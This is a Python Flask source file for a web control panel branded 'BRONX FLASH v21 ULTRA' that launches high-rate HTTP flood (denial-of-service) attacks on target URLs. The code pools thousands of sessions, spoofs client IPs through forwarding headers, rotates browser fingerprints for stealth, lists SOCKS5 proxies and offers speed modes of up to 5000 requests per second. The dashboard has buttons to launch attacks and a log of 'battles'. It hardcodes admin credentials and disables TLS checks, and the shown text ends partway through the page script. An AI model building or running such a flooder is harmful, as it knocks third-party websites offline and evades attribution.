from flask import Flask, request, jsonify, render_template_string, make_response
import requests
import threading
import time
import random
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import json
import os
import socket
import struct
from collections import defaultdict
urllib3.disable_warnings()

app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

# ============================================
# ULTRA FAST SESSION POOL (3000 Sessions)
# ============================================
session_pool = []
session_lock = threading.Lock()
MAX_SESSIONS = 3000
stats_lock = threading.Lock()

# Generate random IPs for spoofing
def generate_random_ip():
    """Generate random IP addresses for X-Forwarded-For spoofing"""
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

# Pre-generated IP pool for ultra speed
IP_POOL = [generate_random_ip() for _ in range(10000)]

# Pre-generated User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]

# Accept headers rotation
ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
]

# Accept-Language rotation
LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "en-US,en;q=0.9,es;q=0.8",
    "en-US,en;q=0.9,fr;q=0.8",
    "en-CA,en;q=0.9",
    "en-AU,en;q=0.8",
]

def create_ultra_session():
    """Create ultra-fast session with random fingerprint"""
    s = requests.Session()
    s.headers.update({
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": random.choice(ACCEPT_HEADERS),
        "Accept-Language": random.choice(LANGUAGES),
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "X-Forwarded-For": random.choice(IP_POOL),
        "X-Real-IP": random.choice(IP_POOL),
        "X-Client-IP": random.choice(IP_POOL),
    })
    # Disable keep-alive for faster connections
    s.headers["Connection"] = "close"
    return s

def initialize_session_pool():
    """Initialize the 3000 session pool"""
    global session_pool
    with session_lock:
        print(f"⚡ Creating {MAX_SESSIONS} ULTRA sessions...")
        for i in range(0, MAX_SESSIONS, 100):
            batch = [create_ultra_session() for _ in range(100)]
            session_pool.extend(batch)
            print(f"   📦 {min(i+100, MAX_SESSIONS)}/{MAX_SESSIONS} sessions ready")
    print(f"✅ {len(session_pool)} ULTRA sessions initialized!")

def get_ultra_session():
    """Get random session with random IP"""
    with session_lock:
        if len(session_pool) < 100:
            # Quick refill
            session_pool.extend([create_ultra_session() for _ in range(200)])
        s = random.choice(session_pool)
        # Rotate IP on every use for maximum stealth
        s.headers.update({
            "X-Forwarded-For": random.choice(IP_POOL),
            "X-Real-IP": random.choice(IP_POOL),
            "X-Client-IP": random.choice(IP_POOL),
            "User-Agent": random.choice(USER_AGENTS),
        })
        return s

# ============================================
# ULTRA FAST ATTACK SYSTEM
# ============================================
active_attacks = {}
attack_stats = {"success": 0, "failed": 0, "total": 0}
attack_logs = []
custom_proxies = []
total_lifetime = {"success": 0, "failed": 0, "total": 0}
rate_limit_config = {"enabled": False, "rpm": 15}
multi_session_config = {"enabled": True, "sessions_per_url": 100, "rotating": True}
ip_log = []

CF_IPS = [
    "104.21.0.1","104.21.0.2","104.21.0.3","104.21.0.4","104.21.0.5",
    "104.16.0.1","104.16.0.2","104.16.0.3",
    "172.67.0.1","172.67.0.2"
]

SOCKS5_PROXIES = [
    "94.158.244.245:1080","68.71.249.153:48606","72.56.107.177:1080",
    "176.114.86.151:1080","43.161.217.219:1080","208.102.51.6:58208",
    "162.253.68.97:4145","167.71.32.51:1080","23.176.40.194:1080",
    "173.212.239.43:1080"
]

# ULTRA SPEED CONFIG (Real 2000+ RPS)
SPEEDS = {
    "slow": {"rate": 10, "delay": 0.01, "workers": 10, "sessions": 20},
    "fast": {"rate": 50, "delay": 0.005, "workers": 25, "sessions": 50},
    "veryfast": {"rate": 200, "delay": 0.001, "workers": 50, "sessions": 100},
    "ultra": {"rate": 500, "delay": 0.0005, "workers": 100, "sessions": 200},
    "lightning": {"rate": 1000, "delay": 0.0001, "workers": 200, "sessions": 500},
    "flash": {"rate": 2000, "delay": 0.00005, "workers": 400, "sessions": 1000},
    "godkiller": {"rate": 3000, "delay": 0.00001, "workers": 600, "sessions": 2000},
    "ultragod": {"rate": 5000, "delay": 0, "workers": 800, "sessions": 3000}
}

EFFECTS = ["snow","matrix","particles","neon","firefly","glitch","pulse","scanlines","bubbles","stars","cyber","quantum"]

# ============================================
# ULTRA FAST ATTACK ENGINE (MULTI-IP)
# ============================================
def ultra_fast_request(url, session, mode, spoofed_ip):
    """Ultra fast request with IP spoofing"""
    try:
        # Update headers with new spoofed IP for EVERY request
        session.headers.update({
            "X-Forwarded-For": spoofed_ip,
            "X-Real-IP": spoofed_ip,
            "X-Client-IP": spoofed_ip,
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": random.choice(ACCEPT_HEADERS),
            "Accept-Language": random.choice(LANGUAGES),
        })
        
        if mode == "cf":
            cf_ip = random.choice(CF_IPS)
            session.get(f"https://{cf_ip}", timeout=3, verify=False)
            return True
        elif mode == "mixed":
            # Randomly choose method for each request
            methods = ["direct", "cf", "spoof"]
            chosen = random.choice(methods)
            if chosen == "cf":
                cf_ip = random.choice(CF_IPS)
                session.get(f"https://{cf_ip}", timeout=3, verify=False)
            else:
                session.get(url, timeout=3, verify=False)
            return True
        else:
            # Direct with spoofed IP
            session.get(url, timeout=3, verify=False)
            return True
    except:
        return False

def attack_burst_worker(attack_id, url, total_count, delay, mode, session_count):
    """Ultra fast burst worker - sends requests in rapid bursts"""
    sessions = [get_ultra_session() for _ in range(session_count)]
    count_per_session = max(1, total_count // len(sessions))
    
    def burst_attack(session, count):
        """Send requests as fast as possible"""
        success_count = 0
        fail_count = 0
        for _ in range(count):
            if attack_id not in active_attacks:
                break
            
            # Rate limiter check (skip if disabled for speed)
            if rate_limit_config["enabled"]:
                time.sleep(60 / rate_limit_config["rpm"])
            
            # Get random spoofed IP
            spoofed_ip = random.choice(IP_POOL)
            
            # Send request
            if ultra_fast_request(url, session, mode, spoofed_ip):
                success_count += 1
            else:
                fail_count += 1
            
            # Minimal delay for ultra speed
            if delay > 0 and random.random() < 0.3:  # Only delay 30% of requests
                time.sleep(delay)
        
        # Batch update stats (reduces lock contention)
        with stats_lock:
            attack_stats["success"] += success_count
            attack_stats["failed"] += fail_count
            attack_stats["total"] += success_count + fail_count
            total_lifetime["success"] += success_count
            total_lifetime["failed"] += fail_count
            total_lifetime["total"] += success_count + fail_count
    
    # Launch all sessions simultaneously
    threads = []
    for session in sessions:
        t = threading.Thread(target=burst_attack, args=(session, count_per_session))
        t.daemon = True
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join(timeout=120)

def run_ultra_attack(attack_id, urls, count, speed, mode):
    """Run ultra fast multi-IP attack"""
    config = SPEEDS.get(speed, SPEEDS["ultragod"])
    
    if multi_session_config["enabled"]:
        sessions_per_url = min(config["sessions"], multi_session_config["sessions_per_url"])
    else:
        sessions_per_url = max(10, config["sessions"] // len(urls))
    
    workers_per_url = max(1, config["workers"] // len(urls))
    
    # Use ThreadPoolExecutor for parallel URL attacks
    with ThreadPoolExecutor(max_workers=min(workers_per_url * len(urls), 1000)) as executor:
        futures = []
        for url in urls:
            for _ in range(workers_per_url):
                future = executor.submit(
                    attack_burst_worker,
                    attack_id, url,
                    count // workers_per_url,
                    config["delay"],
                    mode,
                    sessions_per_url // workers_per_url
                )
                futures.append(future)
        
        # Wait for completion
        for future in as_completed(futures):
            try:
                future.result(timeout=60)
            except:
                pass
    
    if attack_id in active_attacks:
        del active_attacks[attack_id]
    
    attack_logs.append(f"✅ ULTRA Attack Complete: {len(urls)} targets")

# ============================================
# HTML TEMPLATES
# ============================================
LOGIN = r"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX FLASH v21 ULTRA</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Segoe UI',system-ui,sans-serif;overflow:hidden}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle,rgba(255,0,85,0.03) 1px,transparent 1px);background-size:30px 30px;animation:bgMove 15s linear infinite}
@keyframes bgMove{0%{transform:translate(0)}100%{transform:translate(30px,30px)}}
.effect-layer{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
.box{background:rgba(5,0,10,0.97);padding:45px;border-radius:20px;border:1px solid rgba(255,0,85,0.15);width:400px;text-align:center;z-index:1;box-shadow:0 0 80px rgba(255,0,85,0.1),0 0 150px rgba(0,200,255,0.03);animation:pulseBox 3s infinite}
@keyframes pulseBox{50%{box-shadow:0 0 120px rgba(255,0,85,0.25),0 0 200px rgba(0,200,255,0.08)}}
.logo{font-size:3.5em;animation:glow 2s infinite}@keyframes glow{50%{filter:drop-shadow(0 0 25px rgba(255,0,85,0.7))}}
h1{font-size:1.8em;font-weight:800;background:linear-gradient(135deg,#ff0055,#ffd700,#00c8ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:2px;animation:textShine 3s infinite}
@keyframes textShine{50%{filter:brightness(1.2)}}
.tag{color:#555;font-size:0.65em;letter-spacing:4px;text-transform:uppercase;margin:8px 0}
input{width:100%;padding:14px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:10px;color:#fff;margin:8px 0;font-size:14px;transition:0.3s}
input:focus{border-color:#ff0055;box-shadow:0 0 25px rgba(255,0,85,0.15);outline:none}
.btn{width:100%;padding:14px;background:linear-gradient(135deg,#ff0055,#ffd700);color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer;font-size:14px;margin-top:12px;letter-spacing:2px;text-transform:uppercase;transition:0.3s;position:relative;overflow:hidden}
.btn:hover{box-shadow:0 0 50px rgba(255,0,85,0.6);transform:translateY(-2px)}.btn:active{transform:scale(0.96)}
.btn::after{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:linear-gradient(45deg,transparent,rgba(255,255,255,0.15),transparent);animation:btnShine 2s infinite}
@keyframes btnShine{0%{transform:translateX(-100%) rotate(45deg)}100%{transform:translateX(100%) rotate(45deg)}}
.badge{display:inline-block;padding:6px 16px;background:rgba(255,0,85,0.08);border:1px solid rgba(255,0,85,0.2);border-radius:16px;color:#ff0055;font-size:0.6em;letter-spacing:2px;margin-top:8px;animation:badgePulse 2s infinite}
@keyframes badgePulse{50%{box-shadow:0 0 25px rgba(255,0,85,0.25)}}
</style></head><body>
<div class="effect-layer" id="effects"></div>
<div class="box">
<div class="logo">💀</div>
<h1>BRONX FLASH</h1>
<div class="tag">v21 ULTRA • GOD KILLER</div>
<p style="color:#444;font-size:0.55em;letter-spacing:1px">5000 RPS • MULTI-IP • 3000 SESSIONS</p>
<div class="badge">⚡ ULTRA GOD ENGINE ⚡</div>
<form method="post">
<input type="text" name="user" placeholder="Username">
<input type="password" name="pass" placeholder="Password">
<button class="btn" type="submit">☠️ ACCESS SYSTEM</button>
</form>
{% if error %}<p style="color:#ff0055;margin-top:8px;font-size:0.8em">{{ error }}</p>{% endif %}
</div>
<script>
(function(){
var effect='{{ effect }}';
var el=document.getElementById('effects');
var style=document.createElement('style');
style.textContent='@keyframes fall{to{transform:translateY(110vh) rotate(360deg)}}@keyframes float{0%,100%{transform:translateY(0)scale(1)}50%{transform:translateY(-25px)scale(1.3)}}@keyframes twinkle{50%{opacity:0.15}}@keyframes pulseNeon{50%{opacity:0.5}}@keyframes cyberFall{to{transform:translateY(110vh)}}@keyframes quantum{0%,100%{transform:translate(0,0)scale(1);opacity:1}25%{transform:translate(15px,-15px)scale(1.4);opacity:0.4}50%{transform:translate(-15px,8px)scale(0.7);opacity:0.7}75%{transform:translate(8px,15px)scale(1.2);opacity:0.3}}';
document.head.appendChild(style);
function makeEl(t,c,s){var d=document.createElement('div');d.style.cssText=s;if(c)d.innerHTML=c;el.appendChild(d);return d;}
if(effect==='snow')for(var i=0;i<35;i++)makeEl('div','❄️','position:absolute;color:#ff0055;font-size:'+(Math.random()*8+6)+'px;left:'+Math.random()*100+'%;animation:fall '+(Math.random()*4+2)+'s linear infinite;pointer-events:none');
if(effect==='matrix')for(var i=0;i<45;i++)makeEl('div',String.fromCharCode(0x30A0+Math.random()*96),'position:absolute;color:#00ff88;font-size:'+(Math.random()*10+5)+'px;left:'+Math.random()*100+'%;animation:fall '+(Math.random()*2+1.5)+'s linear infinite;pointer-events:none');
if(effect==='particles')for(var i=0;i<25;i++)makeEl('div','','position:absolute;width:'+(Math.random()*2+1)+'px;height:'+(Math.random()*2+1)+'px;background:#ffd700;left:'+Math.random()*100+'%;animation:float '+(Math.random()*3+2)+'s ease-in-out infinite;border-radius:50%;pointer-events:none');
if(effect==='cyber')for(var i=0;i<35;i++)makeEl('div',Math.random()>0.5?'▓':'▒','position:absolute;color:#00c8ff;font-size:'+(Math.random()*12+6)+'px;left:'+Math.random()*100+'%;animation:cyberFall '+(Math.random()*1.5+0.8)+'s linear infinite;pointer-events:none');
if(effect==='stars')for(var i=0;i<20;i++)makeEl('div','','position:absolute;width:2px;height:2px;background:#fff;left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;animation:twinkle '+(Math.random()*1.5+0.8)+'s infinite;pointer-events:none');
if(effect==='quantum')for(var i=0;i<20;i++)makeEl('div','','position:absolute;width:3px;height:3px;background:#ffd700;left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;animation:quantum '+(Math.random()*2+1.5)+'s infinite;border-radius:50%;box-shadow:0 0 15px #ffd700;pointer-events:none');
if(effect==='neon'){el.style.background='radial-gradient(circle,rgba(255,0,85,0.04),transparent)';el.style.animation='pulseNeon 2s infinite';}
if(effect==='firefly')for(var i=0;i<30;i++){var f=makeEl('div','','position:absolute;width:4px;height:4px;background:#ffd700;left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;animation:float '+(Math.random()*2+1)+'s ease-in-out infinite;border-radius:50%;box-shadow:0 0 10px #ffd700,0 0 20px #ffd700;pointer-events:none');}
})();
</script>
</body></html>"""

DASH = r"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX FLASH v21 ULTRA</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;padding:15px;line-height:1.4}
.effect-layer{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
.container{max-width:1400px;margin:0 auto;position:relative;z-index:1}
.header{display:flex;justify-content:space-between;align-items:center;padding:18px 25px;border:1px solid rgba(255,255,255,0.05);border-radius:14px;margin-bottom:18px;background:rgba(255,255,255,0.01);flex-wrap:wrap;gap:12px;animation:headerGlow 3s infinite}
@keyframes headerGlow{50%{border-color:rgba(255,0,85,0.25);box-shadow:0 0 25px rgba(255,0,85,0.08)}}
.header h1{font-size:1.6em;font-weight:800;background:linear-gradient(135deg,#ff0055,#ffd700,#00c8ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:3px}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:18px}
.stat{background:rgba(255,255,255,0.01);border:1px solid rgba(255,255,255,0.04);border-radius:12px;padding:16px;text-align:center;transition:0.3s}.stat:hover{border-color:#ff0055;box-shadow:0 0 15px rgba(255,0,85,0.15)}
.stat-val{font-size:2em;font-weight:800}.s{color:#00ff88}.f{color:#ff0055}.t{color:#ffd700}
.stat-label{font-size:0.55em;text-transform:uppercase;letter-spacing:2px;color:#555;margin-top:4px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(350px,1fr));gap:14px;margin-bottom:18px}
.card{background:rgba(255,255,255,0.01);border:1px solid rgba(255,255,255,0.04);border-radius:12px;padding:20px;transition:0.3s}.card:hover{border-color:rgba(255,0,85,0.15)}
.card h3{font-size:0.7em;font-weight:600;letter-spacing:2px;text-transform:uppercase;margin-bottom:14px;color:#666}
input,select,textarea{width:100%;padding:10px 12px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.05);border-radius:7px;color:#fff;margin:4px 0;font-size:12px;font-family:inherit;resize:vertical;transition:0.2s}
input:focus,select:focus,textarea:focus{border-color:#ff0055;box-shadow:0 0 15px rgba(255,0,85,0.1);outline:none}
label{font-size:0.55em;text-transform:uppercase;letter-spacing:1.5px;color:#555;display:block;margin-top:8px}
.btn{width:100%;padding:11px;background:linear-gradient(135deg,#ff0055,#ffd700);color:#000;border:none;border-radius:7px;font-weight:600;cursor:pointer;font-size:0.7em;letter-spacing:1.5px;text-transform:uppercase;transition:0.3s;margin:4px 0;position:relative;overflow:hidden}
.btn:hover{box-shadow:0 0 35px rgba(255,0,85,0.4);transform:translateY(-1px)}.btn:active{transform:scale(0.97)}
.btn::after{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:linear-gradient(45deg,transparent,rgba(255,255,255,0.12),transparent);animation:shine 2s infinite}
@keyframes shine{0%{transform:translateX(-100%) rotate(45deg)}100%{transform:translateX(100%) rotate(45deg)}}
.btn-secondary{background:rgba(255,255,255,0.03);color:#888;border:1px solid rgba(255,255,255,0.08)}.btn-secondary:hover{box-shadow:0 0 15px rgba(255,255,255,0.08);color:#fff}
.btn-danger{background:rgba(255,0,0,0.12);color:#ff4444;border:1px solid rgba(255,0,0,0.15)}.btn-danger:hover{box-shadow:0 0 20px rgba(255,0,0,0.25)}
.btn-reset{background:rgba(255,215,0,0.12);color:#ffd700;border:1px solid rgba(255,215,0,0.15)}.btn-reset:hover{box-shadow:0 0 20px rgba(255,215,0,0.25)}
.btn-cyan{background:rgba(0,200,255,0.12);color:#00c8ff;border:1px solid rgba(0,200,255,0.15)}.btn-cyan:hover{box-shadow:0 0 20px rgba(0,200,255,0.25)}
.row{display:grid;grid-template-columns:1fr 1fr;gap:8px}.row3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px}
.logs{background:rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.03);border-radius:8px;padding:12px;max-height:280px;overflow:auto;font-size:0.65em;font-family:'SF Mono',monospace;color:#00ff88}
.log-e{padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.01);color:#888}
.badge{display:inline-block;padding:4px 12px;border-radius:16px;font-size:0.55em;letter-spacing:1.5px;text-transform:uppercase}
.badge-active{background:rgba(255,0,85,0.12);color:#ff0055;animation:blink 1s infinite}@keyframes blink{50%{opacity:0.3}}
.badge-multi{background:rgba(0,200,255,0.12);color:#00c8ff;animation:blink 1s infinite}
.toggle-row{display:flex;align-items:center;gap:10px;margin:8px 0}
.toggle{width:40px;height:22px;background:rgba(255,255,255,0.06);border-radius:11px;cursor:pointer;position:relative;transition:0.3s}
.toggle.on{background:#ff0055;box-shadow:0 0 15px rgba(255,0,85,0.3)}.toggle::after{content:'';position:absolute;top:2px;left:2px;width:18px;height:18px;background:#fff;border-radius:50%;transition:0.3s}.toggle.on::after{left:20px}
.footer{text-align:center;padding:15px;color:rgba(255,255,255,0.1);font-size:0.55em;letter-spacing:2px}
.effect-select{display:flex;flex-wrap:wrap;gap:4px;margin:4px 0}
.effect-opt{padding:5px 10px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:16px;color:#666;font-size:0.55em;cursor:pointer;transition:0.2s;letter-spacing:1px}
.effect-opt:hover,.effect-opt.active{border-color:#ff0055;color:#ff0055;background:rgba(255,0,85,0.08)}
.session-info{background:rgba(0,200,255,0.04);border:1px solid rgba(0,200,255,0.1);border-radius:8px;padding:12px;margin:8px 0;text-align:center}
.session-count{font-size:2.5em;font-weight:800;color:#00c8ff;animation:sessionPulse 2s infinite}
@keyframes sessionPulse{50%{text-shadow:0 0 35px rgba(0,200,255,0.5)}}
</style></head><body>
<div class="effect-layer" id="effects"></div>
<div class="container">
<div class="header">
<div><h1>⚡ BRONX FLASH v21 ULTRA</h1><div style="color:#444;font-size:0.55em;letter-spacing:2px">5000 RPS • MULTI-IP • 3000 SESSIONS • GOD KILLER</div></div>
<div style="display:flex;gap:8px;align-items:center">
<span style="color:#555;font-size:0.55em" id="liveTime"></span>
<a href="/logout" style="color:#ff0055;text-decoration:none;font-size:0.65em;letter-spacing:1.5px">DISCONNECT</a>
</div>
</div>

<div class="stats">
<div class="stat"><div class="stat-val s" id="success">0</div><div class="stat-label">✅ Success</div></div>
<div class="stat"><div class="stat-val f" id="failed">0</div><div class="stat-label">❌ Failed</div></div>
<div class="stat"><div class="stat-val t" id="total">0</div><div class="stat-label">📊 Total</div></div>
</div>

<div class="stats" style="grid-template-columns:repeat(4,1fr)">
<div class="stat"><div class="stat-val t" style="font-size:1.5em" id="ltSuccess">0</div><div class="stat-label">🏆 Lifetime Wins</div></div>
<div class="stat"><div class="stat-val t" style="font-size:1.5em" id="ltTotal">0</div><div class="stat-label">📊 Lifetime Total</div></div>
<div class="stat"><div class="stat-val" style="font-size:1.5em;color:#00c8ff" id="activeSessions">0</div><div class="stat-label">🔗 Active</div></div>
<div class="stat"><div class="stat-val" style="font-size:1.5em;color:#ffd700" id="poolSize">3000</div><div class="stat-label">📦 Pool</div></div>
</div>

<div class="grid">
<div class="card">
<h3>🎯 Attack Configuration</h3>
<label>Target URLs (One per line)</label>
<textarea id="urls" rows="2" placeholder="https://target1.com&#10;https://target2.com"></textarea>
<div class="row"><div><label>Requests per URL</label><input type="number" id="count" value="10000"></div><div>
<label>Speed Mode</label><select id="speed">
<option value="slow">🐢 Slow (10/s)</option>
<option value="fast">⚡ Fast (50/s)</option>
<option value="veryfast">🔥 Very Fast (200/s)</option>
<option value="ultra">💀 Ultra (500/s)</option>
<option value="lightning">⚡ Lightning (1000/s)</option>
<option value="flash">💎 FLASH (2000/s)</option>
<option value="godkiller">☠️ GOD KILLER (3000/s)</option>
<option value="ultragod" selected>👑 ULTRA GOD (5000/s)</option>
</select></div></div>
<label>Attack Mode</label><select id="mode">
<option value="direct">Direct (Fast)</option>
<option value="mixed" selected>Mixed IP (Stealth)</option>
<option value="cf">Cloudflare IP</option>
</select>
<button class="btn" onclick="start()">🚀 LAUNCH ULTRA ATTACK</button>
<button class="btn btn-danger" onclick="stop()">⏹️ TERMINATE ALL</button>
<div id="status" style="margin-top:6px"></div>
</div>

<div class="card">
<h3>⚡ Multi-IP Session Engine</h3>
<div class="session-info">
<div class="session-count" id="sessionDisplay">3000</div>
<div style="color:#888;font-size:0.55em;letter-spacing:1.5px">ACTIVE SESSION POOL (MULTI-IP)</div>
</div>
<div class="toggle-row"><span style="font-size:0.65em;color:#666">Multi-Session</span><div class="toggle on" id="multiToggle" onclick="toggleMulti()"></div><span id="multiLabel" style="font-size:0.65em;color:#00c8ff">ON</span></div>
<div class="toggle-row"><span style="font-size:0.65em;color:#666">IP Rotation</span><div class="toggle on" id="rotateToggle" onclick="toggleRotate()"></div><span id="rotateLabel" style="font-size:0.65em;color:#00c8ff">ON</span></div>
<label>Sessions Per URL</label><input type="number" id="sessionsPerUrl" value="200" min="1" max="3000">
<button class="btn btn-cyan" onclick="saveMultiSession()">💾 Save Config</button>
<button class="btn btn-reset" onclick="refreshSessions()">🔄 Refresh Pool</button>
</div>

<div class="card">
<h3>⚙️ Rate Limiter</h3>
<div class="toggle-row"><span style="font-size:0.65em;color:#666">Rate Limiter</span><div class="toggle" id="rateToggle" onclick="toggleRate()"></div><span id="rateLabel" style="font-size:0.65em;color:#666">OFF</span></div>
<label>Requests Per Minute</label><input type="number" id="rpm" value="15">
<button class="btn btn-secondary" onclick="saveRate()">💾 Save</button>
</div>

<div class="card">
<h3>🔧 Proxy System</h3>
<div class="toggle-row"><span style="font-size:0.65em;color:#666">Proxy System</span><div class="toggle" id="proxyToggle" onclick="toggleProxy()"></div><span id="proxyLabel" style="font-size:0.65em;color:#666">OFF</span></div>
<label>Custom Proxies (IP:Port)</label>
<textarea id="customProxies" rows="2" placeholder="94.158.244.245:1080"></textarea>
<button class="btn btn-secondary" onclick="saveProxies()">💾 Save Proxies</button>
</div>

<div class="card">
<h3>🌐 Network</h3>
<div style="font-size:1.3em;color:#ffd700;text-align:center;padding:8px" id="browserIP">Loading...</div>
<button class="btn btn-secondary" onclick="copyIP()">📋 Copy IP</button>
<button class="btn btn-cyan" onclick="testLatency()">📡 Test Latency</button>
<div id="latencyResult" style="margin-top:6px;text-align:center"></div>
</div>

<div class="card">
<h3>🎨 Effects (Works Here + Login)</h3>
<div class="effect-select" id="effectSelect">
{% for e in effects %}<span class="effect-opt{% if e==current_effect %} active{% endif %}" onclick="setEffect('{{e}}')">{{e}}</span>{% endfor %}
</div>
<div class="row" style="margin-top:8px">
<button class="btn btn-reset" onclick="resetStats()">🔄 Reset Session</button>
<button class="btn btn-reset" onclick="resetLifetime()">🗑️ Reset Lifetime</button>
</div>
</div>

<div class="card">
<h3>📊 Live Stats</h3>
<div class="row3">
<div class="stat"><div class="stat-val t" style="font-size:1.3em" id="successRate">0%</div><div class="stat-label">Success Rate</div></div>
<div class="stat"><div class="stat-val s" style="font-size:1.3em" id="rps">0</div><div class="stat-label">Req/Sec</div></div>
<div class="stat"><div class="stat-val" style="font-size:1.3em;color:#00c8ff" id="threadCount">0</div><div class="stat-label">Threads</div></div>
</div>
</div>
</div>

<div class="card"><h3>📜 Battle Logs</h3><div class="logs" id="logs"><div class="log-e">💀 BRONX FLASH v21 ULTRA - 5000 RPS Ready</div><div class="log-e">⚡ Multi-IP Engine: ACTIVE (10000 spoofed IPs)</div><div class="log-e">🔗 Session Pool: 3000 sessions loaded</div><div class="log-e">🛡️ Stealth Mode: Each request = Different IP</div><div class="log-e">System armed. Awaiting command...</div></div></div>
<div class="footer">💀 BRONX FLASH v21 ULTRA • 5000 RPS • 3000 SESSIONS • MULTI-IP • GOD KILLER 💀</div>
</div>

<script>
var proxyOn=false,rateOn=false,multiOn=true,rotateOn=true;
var lastTotal=0,lastTime=Date.now();

function toggleProxy(){proxyOn=!proxyOn;document.getElementById('proxyToggle').classList.toggle('on',proxyOn);document.getElementById('proxyLabel').textContent=proxyOn?'ON':'OFF'}
function toggleRate(){rateOn=!rateOn;document.getElementById('rateToggle').classList.toggle('on',rateOn);document.getElementById('rateLabel').textContent=rateOn?'ON':'OFF'}
function toggleMulti(){multiOn=!multiOn;document.getElementById('multiToggle').classList.toggle('on',multiOn);var l=document.getElementById('multiLabel');l.textContent=multiOn?'ON':'OFF';l.style.color=multiOn?'#00c8ff':'#666'}
function toggleRotate(){rotateOn=!rotateOn;document.getElementById('rotateToggle').classList.toggle('on',rotateOn);var l=document.getElementById('rotateLabel');l.textContent=rotateOn?'ON':'OFF';l.style.color=rotateOn?'#00c8ff':'#666'}

function saveRate(){fetch('/rate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled:rateOn,rpm:parseInt(document.getElementById('rpm').value)})})}
